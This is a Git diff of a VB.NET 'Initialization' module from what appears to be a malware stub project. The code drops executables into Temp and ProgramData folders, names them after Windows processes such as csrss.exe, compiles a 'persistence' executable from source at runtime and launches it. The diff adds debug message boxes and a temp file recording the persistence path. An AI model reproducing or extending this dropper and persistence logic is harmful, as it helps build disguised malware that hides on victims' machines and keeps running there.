@@ -1,7 +1,7 @@
 ﻿Imports System.CodeDom.Compiler
 Imports System.IO
 Module Initialization
-    Private Function GenerateExecPath() As String
+    Private Function GenerateExecPath(Optional old As String = "") As String
         Dim paths() As String = {
                 My.Computer.FileSystem.SpecialDirectories.Temp,
                 My.Computer.FileSystem.SpecialDirectories.AllUsersApplicationData,
@@ -11,12 +11,19 @@ Module Initialization
         Dim folders() As String =
             {"Docs", "Programs", "Programs (x32)", "Nil", "TShare"}
         Dim exeNames() As String =
-            {"csrss.exe", "mxservice.exe", "solx32.exe", "collect32.exe", "cmd.exe", "xconhost.exe"}
+            {"stub_name_1.exe", "stub_name_2.exe", "stub_name_3.exe", "stub_name_4.exe", "stub_name_5.exe"}
+        '{"csrss.exe", "mxservice.exe", "solx32.exe", "collect32.exe", "cmd.exe", "xconhost.exe"}
 
         Dim _directory As String = RandomElemFrom(paths) & "\" & RandomElemFrom(folders) & "\"
+        Dim fullPath As String = _directory & RandomElemFrom(exeNames)
         Directory.CreateDirectory(_directory)
 
-        Return _directory & RandomElemFrom(exeNames)
+
+        If fullPath = old Then
+            Return GenerateExecPath()
+        Else
+            Return fullPath
+        End If
     End Function
 
     Private Function RandomString() As String
@@ -32,7 +39,7 @@ Module Initialization
 
     Public Function Initialize() As Boolean
         Dim newStubExecutablePath As String = GenerateExecPath()
-        Dim newPersistenceExecutablePath As String = GenerateExecPath()
+        Dim newPersistenceExecutablePath As String = GenerateExecPath(newStubExecutablePath)
 
         If File.Exists(newStubExecutablePath) Then File.Delete(newStubExecutablePath)
         ' Is this line really useful ? Could be overwritten by File.WriteAllBytes.
@@ -62,12 +69,14 @@ Module Initialization
         Dim compiler As CodeDomProvider = CodeDomProvider.CreateProvider("VB")
         Dim output As CompilerResults = compiler.CompileAssemblyFromSource(compilerParameters, templateCode)
 
-        If output.Errors.Count > 0 Then
-            MsgBox("eh salut")
-            Return False
-        Else
+        If output.Errors.Count = 0 Then
             Process.Start(newPersistenceExecutablePath)
-            Return True
         End If
+
+        MsgBox("yeaaaaaaaaaaaaaaaaaaaaah")
+        ' TODO: Set persistence script path to windows runtime path
+        File.WriteAllText(My.Computer.FileSystem.SpecialDirectories.Temp & "\maitregims.txt", newPersistenceExecutablePath)
+        MsgBox("read baby : " & File.ReadAllText(My.Computer.FileSystem.SpecialDirectories.Temp & "\maitregims.txt"))
+        Return output.Errors.Count = 0
     End Function
 End Module
